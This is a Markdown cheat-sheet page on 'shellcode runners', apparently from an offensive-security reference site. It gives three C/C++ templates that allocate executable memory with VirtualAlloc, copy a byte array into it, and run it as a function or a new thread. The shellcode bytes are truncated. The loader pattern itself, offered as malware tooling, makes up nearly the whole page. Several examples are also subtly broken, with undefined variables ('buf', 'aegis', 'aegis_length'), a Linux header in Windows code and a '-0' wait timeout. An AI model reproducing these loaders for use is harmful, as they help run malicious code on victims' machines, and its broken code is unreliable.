---
title: Shellcode Runners
date: 2026-01-26 
background: bg-[#7F1D1D]
icon: malware.svg
iconSize: 30
tags:
  - shellcode
  - exploitation
  - malware
  - evasion
categories:
  - Offensive Programming
intro: |
  Techniques and examples for executing shellcode in memory, covering common runner & loader patterns.
plugins:
  - copyCode

---


## Basics

### Intro

Basic shellcode runners require three things

- **1** They require somewhere to put your shellcode
- **2** They require something to execute your sehllcode
- **3** They require something to keep the process alive

There are manny different methods to accomplishing this.

This section **DOES NOT** discussion evasion techniques

## Windows Shellcode Runner Examples

### Simple C Method {.col-span-3}

```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = 
"\x48\x31\xc0\x48...";

int main() {
    // Allocate executable memory
    void *exec_mem = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy shellcode to executable memory
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    //Cast to function pointer and execute
    ((void(*)())exec_mem)();

    return 0;
}
```


### C++ Methods {.col-span-3}

 
#### Straight Memory Allocaiton
```cpp
#include <iostream>
#include <Windows.h>

int main()
{
	void* execute;
	HANDLE thread;

	unsigned char payload[] =
		"\xe5\x31\x6c\xcd...";


	unsigned int payload_len = sizeof(payload);

	//make space for our shellcode
	execute = VirtualAlloc(0, aegis_length, MEM_COMMIT | MEM_RESERVE, 0x40);

	//copy the shellcode into the execute buffer
	RtlMoveMemory(execute, aegis, aegis_length);

	//execute our shellcode
	thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0);

	//hold the execution
	WaitForSingleObject(thread, -0);
}
```


#### Proper Memory Protect Usage 
```cpp
#include <iostream>
#include <Windows.h>


int main(){
	void* execute;
	HANDLE thread;
	DWORD oldProtect = 0;

	unsigned char buf[] =
		"\x48\x31\xc9\x48...";

	unsigned int buf_length = sizeof(buf);
	
	//make space for our shellcode
	execute = VirtualAlloc(0, buf_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	//copy the shellcode into the execute buffer
	RtlMoveMemory(execute, buf, buf_length);

	VirtualProtect(execute, buf_length, PAGE_EXECUTE_READ, &oldProtect);

	//execute our shellcode
	thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) execute, 0, 0, 0);

	//hold the execution
	WaitForSingleObject(thread, INFINITE);
}
```